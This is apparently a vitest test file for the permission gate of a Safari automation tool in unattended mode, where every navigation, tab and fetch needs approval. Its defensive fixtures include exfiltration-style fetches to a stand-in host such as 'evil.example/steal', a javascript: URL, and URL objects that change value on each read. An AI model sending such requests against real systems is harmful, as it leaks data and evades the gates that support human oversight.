// 사람 없음 모드(SAFARI_ATTRACTION_UNATTENDED=1): 관문이 있으면 모든 이동 · 새 탭 · fetch 를 묻고, 사파리를 켜지 않고, 새 창을 열지 않는다.
import { afterEach, describe, expect, test } from "vitest";
import { createJxaDriver, opError } from "../../src/driver/jxa-driver.js";
import { HostError } from "../../src/driver/jxa-host.js";
import { unattendedFromEnv, type ActionGate, type GateRequest } from "../../src/gate/gate.js";
import { createReplSession, type ReplSession } from "../../src/repl/context.js";
import { createFakeDriver } from "../helpers/fake-driver.js";

/** 보낸 주소를 그대로 답의 최종 주소로 돌려주는 가짜 페이지(redirectTo 가 있으면 그리로 넘어간 것처럼). */
const sentUrl = (src: string): string => /"url":("(?:[^"\\]|\\.)*")/.exec(src)?.[1] ? JSON.parse(/"url":("(?:[^"\\]|\\.)*")/.exec(src)![1]!) : "";
let redirectTo: string | undefined;
const fetchAnswer = (_k: string, src: string) =>
  src.includes("__saA") ? JSON.stringify({ ok: true, r: { s: JSON.stringify({ status: 200, ok: true, statusText: "OK", url: redirectTo ?? sentUrl(src), headers: {}, body: "{}" }) } }) : "";

function make(opts: { unattended?: boolean; gate?: boolean; allow?: boolean | ((r: GateRequest) => boolean) } = {}) {
  const asked: GateRequest[] = [];
  const ok = (r: GateRequest): boolean => (typeof opts.allow === "function" ? opts.allow(r) : opts.allow !== false);
  const gate: ActionGate = { check: async (r) => (asked.push(r), ok(r) ? { allow: true } : { allow: false, reason: "막음" }) };
  const dd = createFakeDriver();
  dd.answer = fetchAnswer;
  const ss = createReplSession(dd, { gate: opts.gate === false ? null : gate, unattended: opts.unattended });
  return { asked, dd, ss };
}

let live: ReplSession | undefined;
afterEach(async () => {
  redirectTo = undefined;
  await live?.dispose();
  live = undefined;
});

describe("unattendedFromEnv", () => {
  test("SAFARI_ATTRACTION_UNATTENDED=1 일 때만 켜진다", () => {
    expect(unattendedFromEnv({ SAFARI_ATTRACTION_UNATTENDED: "1" })).toBe(true);
    for (const v of [undefined, "", "0", "true", "yes"]) expect(unattendedFromEnv({ SAFARI_ATTRACTION_UNATTENDED: v }), String(v)).toBe(false);
    expect(unattendedFromEnv({})).toBe(false);
  });
});

describe("사람 없음 모드 꺼짐(지금과 같음)", () => {
  test("openTab(웹 주소) · GET fetch 를 묻지 않는다", async () => {
    const { asked, ss } = make({});
    live = ss;
    await ss.run('await openTab("http://a/"); await fetch("/api"); await fetch("/api", { method: "HEAD" })');
    expect(asked).toHaveLength(0);
  });
  test("openAiWindow 가 열린다", async () => {
    const { dd, ss } = make({});
    live = ss;
    expect((await ss.run('await openAiWindow("http://a/")')).error).toBeUndefined();
    expect(dd.calls.openWindow).toHaveLength(1);
  });
  test("바꾸는 fetch 의 host 는 지금처럼 지금 페이지의 호스트", async () => {
    const { asked, ss } = make({});
    live = ss;
    await ss.run('await openTab("http://a/"); await fetch("http://evil.example/x", { method: "POST" })');
    expect(asked).toHaveLength(1);
    expect(asked[0]).toMatchObject({ host: "a", action: "fetch", irreversible: true });
  });
});

describe("사람 없음 모드 + 관문", () => {
  test("openTab(웹 주소)은 {action:open, host, irreversible:false} 로 묻고, 허락이면 연다", async () => {
    const { asked, dd, ss } = make({ unattended: true });
    live = ss;
    const r = await ss.run('await openTab("https://www.coupang.com/np/search?q=a")');
    expect(r.error).toBeUndefined();
    expect(asked).toHaveLength(1);
    expect(asked[0]).toMatchObject({ host: "www.coupang.com", url: "https://www.coupang.com/np/search?q=a", action: "open", irreversible: false });
    expect(dd.calls.openTab).toHaveLength(1);
  });
  test("openTab 거절이면 ACTION_DENIED 이고 탭을 열지 않는다", async () => {
    const { dd, ss } = make({ unattended: true, allow: false });
    live = ss;
    const r = await ss.run('await openTab("http://a/")');
    expect(r.errorCode).toBe("ACTION_DENIED");
    expect(dd.calls.openTab).toHaveLength(0);
  });
  test("about:blank 도 묻는다(모든 주소) — 호스트는 빈 글", async () => {
    const { asked, ss } = make({ unattended: true });
    live = ss;
    await ss.run('await openTab("about:blank")');
    expect(asked.map((r) => [r.action, r.host])).toEqual([["open", ""]]);
  });
  test("웹 주소가 아닌 곳(javascript: 등)은 지금처럼 evaluate 로 묻는다", async () => {
    const { asked, dd, ss } = make({ unattended: true, allow: false });
    live = ss;
    const r = await ss.run('await openTab("javascript:alert(1)")');
    expect(r.errorCode).toBe("ACTION_DENIED");
    expect(asked.map((q) => [q.action, q.irreversible])).toEqual([["evaluate", null]]);
    expect(dd.calls.openTab).toHaveLength(0);
  });
  test("GET · HEAD · 메서드 없는 fetch 도 {action:fetch, irreversible:false} 로 묻는다", async () => {
    const { asked, ss } = make({ unattended: true });
    live = ss;
    await ss.run('await openTab("http://a/")');
    asked.length = 0;
    await ss.run('await fetch("/api"); await fetch("/api", { method: "GET" }); await fetch("/api", { method: "head" })');
    expect(asked.map((r) => [r.action, r.irreversible])).toEqual([["fetch", false], ["fetch", false], ["fetch", false]]);
    expect(asked[0]).toMatchObject({ host: "a", target: "GET /api" });
  });
  test("바꾸는 fetch 는 지금처럼 irreversible true", async () => {
    const { asked, ss } = make({ unattended: true });
    live = ss;
    await ss.run('await openTab("http://a/")');
    asked.length = 0;
    await ss.run('await fetch("/api", { method: "POST", body: "비밀 본문" })');
    expect(asked).toHaveLength(1);
    expect(asked[0]).toMatchObject({ action: "fetch", irreversible: true, target: "POST /api" });
    expect(JSON.stringify(asked)).not.toContain("비밀 본문");
  });
  test("fetch 는 가려는 주소의 호스트로 묻는다(다른 사이트로 값을 내보내는 길을 막으려고)", async () => {
    const { asked, ss } = make({ unattended: true });
    live = ss;
    await ss.run('await openTab("http://a/")');
    asked.length = 0;
    await ss.run('await fetch("https://evil.example/steal?x=1")');
    await ss.run('await fetch("//cdn.example/x.js")');
    await ss.run('await fetch("/same")');
    expect(asked.map((r) => r.host)).toEqual(["evil.example", "cdn.example", "a"]);
    expect(asked[0]).toMatchObject({ url: "https://evil.example/steal?x=1", target: "GET https://evil.example/steal?x=1" });
  });
  test("fetch 거절이면 ACTION_DENIED 이고 요청이 안 나간다", async () => {
    const { dd, ss } = make({ unattended: true, allow: (r) => r.action !== "fetch" });
    live = ss;
    await ss.run('await openTab("http://a/")');
    const r = await ss.run('await fetch("/api")');
    expect(r.errorCode).toBe("ACTION_DENIED");
    expect(dd.calls.runJs.some((c) => c.source.includes("__saA"))).toBe(false);
  });
  test("묻는 주소와 보내는 주소가 같다 — 상대 주소는 서버가 풀어 절대 주소로 보낸다(페이지의 <base> 와 무관)", async () => {
    const { asked, dd, ss } = make({ unattended: true });
    live = ss;
    await ss.run('await openTab("http://a/dir/")');
    asked.length = 0;
    await ss.run('await fetch("x?q=1")');
    const sent = dd.calls.runJs.filter((c) => c.source.includes("__saA")).map((c) => sentUrl(c.source));
    expect(asked[0]!.url).toBe("http://a/dir/x?q=1");
    expect(sent).toEqual(["http://a/dir/x?q=1"]);
  });
  test("fetch 주소가 부를 때마다 다른 값을 돌려주는 객체여도 한 값만 쓴다", async () => {
    const { asked, dd, ss } = make({ unattended: true });
    live = ss;
    await ss.run('await openTab("http://a/")');
    asked.length = 0;
    await ss.run('let n = 0; await fetch({ toString() { n++; return n === 1 ? "http://ok.example/p" : "http://evil.example/p"; } })');
    const sent = dd.calls.runJs.filter((c) => c.source.includes("__saA")).map((c) => sentUrl(c.source));
    expect(asked).toHaveLength(1);
    expect(asked[0]).toMatchObject({ host: "ok.example", url: "http://ok.example/p" });
    expect(sent).toEqual(["http://ok.example/p"]);
  });
  test("openTab 주소가 부를 때마다 달라지는 객체여도 물은 주소 그대로 연다", async () => {
    const { asked, dd, ss } = make({ unattended: true });
    live = ss;
    await ss.run('let n = 0; await openTab({ toString() { n++; return n === 1 ? "http://ok.example/p" : "http://evil.example/p"; } })');
    expect(asked[0]).toMatchObject({ action: "open", host: "ok.example", url: "http://ok.example/p" });
    expect(dd.calls.openTab.map((c) => c.url)).toEqual(["http://ok.example/p"]);
  });
  test("goto 도 물은 절대 주소를 그대로 보낸다(상대 주소 · 달라지는 객체)", async () => {
    const { asked, dd, ss } = make({ unattended: true });
    live = ss;
    await ss.run('await openTab("http://a/dir/")');
    asked.length = 0;
    await ss.run('await page.goto("y")');
    await ss.run('let n = 0; await page.goto({ toString() { n++; return n === 1 ? "http://ok.example/p" : "http://evil.example/p"; } })');
    const sent = dd.calls.runJs.filter((c) => c.source.includes('"op":"goto"')).map((c) => sentUrl(c.source));
    expect(asked.map((r) => [r.action, r.url])).toEqual([["goto", "http://a/dir/y"], ["goto", "http://ok.example/p"]]);
    expect(sent).toEqual(["http://a/dir/y", "http://ok.example/p"]);
  });
  test("사람 없음이 아니면 goto 는 원문을 그대로 보낸다(지금과 같음)", async () => {
    const { dd, ss } = make({});
    live = ss;
    await ss.run('await openTab("http://a/dir/")');
    await ss.run('await page.goto("y")');
    expect(dd.calls.runJs.filter((c) => c.source.includes('"op":"goto"')).map((c) => sentUrl(c.source))).toEqual(["y"]);
  });
  test("리다이렉트로 묻지 않은 호스트에 닿은 응답은 돌려주지 않는다(NOT_ALLOWED)", async () => {
    const { ss } = make({ unattended: true });
    live = ss;
    await ss.run('await openTab("http://a/")');
    redirectTo = "http://evil.example/landing";
    const r = await ss.run('const r = await fetch("/api"); console.log(await r.text())');
    expect(r.errorCode).toBe("NOT_ALLOWED");
    expect(r.error).toContain("허락한 사이트 밖으로 넘어간 응답이라 돌려주지 않아요");
    expect(r.output ?? "").not.toContain("{}");
    redirectTo = undefined;
    expect((await ss.run('const r = await fetch("/api"); console.log(r.status)')).output).toBe("200"); // 같은 호스트면 돌려준다
  });
  test("reload · 뒤로 가기의 호스트는 지금 페이지의 것", async () => {
    const { asked, ss } = make({ unattended: true });
    live = ss;
    await ss.run('await openTab("http://a/p")');
    asked.length = 0;
    await ss.run("await page.reload()");
    await ss.run("await page.goBack()");
    expect(asked.map((r) => [r.action, r.host, r.url])).toEqual([["nav", "a", "http://a/p"], ["nav", "a", "http://a/p"]]);
  });
  test("goto · reload · 뒤로 가기도 묻는다(호스트는 가려는 곳 · 지금 곳)", async () => {
    const { asked, ss } = make({ unattended: true });
    live = ss;
    await ss.run('await openTab("http://a/")');
    asked.length = 0;
    await ss.run('await page.goto("http://b/x")');
    await ss.run("await page.reload()");
    await ss.run("await page.goBack()");
    expect(asked.map((r) => [r.action, r.irreversible])).toEqual([["goto", false], ["nav", false], ["nav", false]]);
    expect(asked[0]).toMatchObject({ host: "b", url: "http://b/x" });
  });
  test("openAiWindow 는 NOT_ALLOWED — 묻지도 창을 열지도 않는다", async () => {
    const { asked, dd, ss } = make({ unattended: true });
    live = ss;
    const r = await ss.run('await openAiWindow("http://a/")');
    expect(r.errorCode).toBe("NOT_ALLOWED");
    expect(r.error).toContain("사람 없이 도는 일은 새 창을 열지 않아요");
    expect(dd.calls.openWindow).toHaveLength(0);
    expect(dd.calls.openTab).toHaveLength(0);
    expect(asked).toHaveLength(0);
  });
});

describe("사람 없음 모드인데 관문이 없다", () => {
  test("아무것도 묻지 않고 openTab · fetch 는 돌지만 openAiWindow 는 NOT_ALLOWED", async () => {
    const { dd, ss } = make({ unattended: true, gate: false });
    live = ss;
    expect((await ss.run('await openTab("http://a/"); await fetch("/api")')).error).toBeUndefined();
    const r = await ss.run('await openAiWindow("http://a/")');
    expect(r.errorCode).toBe("NOT_ALLOWED");
    expect(dd.calls.openWindow).toHaveLength(0);
  });
});

describe("사람 없음 모드 드라이버", () => {
  function stubHost(answers: Record<string, unknown | (() => unknown)>) {
    const calls: Array<{ op: string; args: Record<string, unknown> }> = [];
    return {
      calls,
      host: {
        async call(op: string, args: object = {}) {
          calls.push({ op, args: args as Record<string, unknown> });
          const a = answers[op];
          const v = typeof a === "function" ? (a as () => unknown)() : a;
          if (v instanceof Error) throw v;
          return v;
        },
        async close() {},
      },
    };
  }
  const tab = { windowId: 5, index: 1, title: "", url: "http://x/", isActive: false, stamped: true };

  test("openTab: 사파리가 꺼져 있으면 켜지 않고 SAFARI_NOT_RUNNING", async () => {
    const { calls, host } = stubHost({ openTab: new HostError("사파리가 꺼져 있음", undefined, "SAFARI_NOT_RUNNING") });
    const d = createJxaDriver({ host, unattended: true });
    await expect(d.openTab("http://x/")).rejects.toMatchObject({
      code: "SAFARI_NOT_RUNNING",
      message: "사파리가 켜져 있지 않아요 — 사람 없이 도는 일은 사파리를 켜지 않아요",
    });
    expect(calls.map((c) => c.op)).toEqual(["openTab"]); // 켠 뒤 다시 시도하지 않는다(launchSafari 의 listWindows 도 없다)
  });
  test("openTab: 열린 창이 하나도 없으면 호스트에 새 창 만들기 금지를 알린다", async () => {
    const { calls, host } = stubHost({ openTab: tab });
    const d = createJxaDriver({ host, unattended: true });
    await d.openTab("http://x/");
    expect(calls[0]!.args.noNewWindow).toBe(true);
  });
  test("사람 없음이 아니면 noNewWindow 를 보내지 않는다", async () => {
    const { calls, host } = stubHost({ openTab: tab });
    const d = createJxaDriver({ host });
    await d.openTab("http://x/");
    expect("noNewWindow" in calls[0]!.args).toBe(false);
  });
  test("호스트가 NOT_ALLOWED 로 답하면 NOT_ALLOWED 오류", () => {
    const e = opError("openTab", new HostError("사람 없이 도는 일은 새 창을 열지 않아요", undefined, "NOT_ALLOWED"));
    expect(e.code).toBe("NOT_ALLOWED");
  });
  test("openWindow: 호스트를 부르지 않고 NOT_ALLOWED", async () => {
    const { calls, host } = stubHost({});
    const d = createJxaDriver({ host, unattended: true });
    await expect(d.openWindow("http://x/")).rejects.toMatchObject({ code: "NOT_ALLOWED" });
    expect(calls).toHaveLength(0);
  });
});
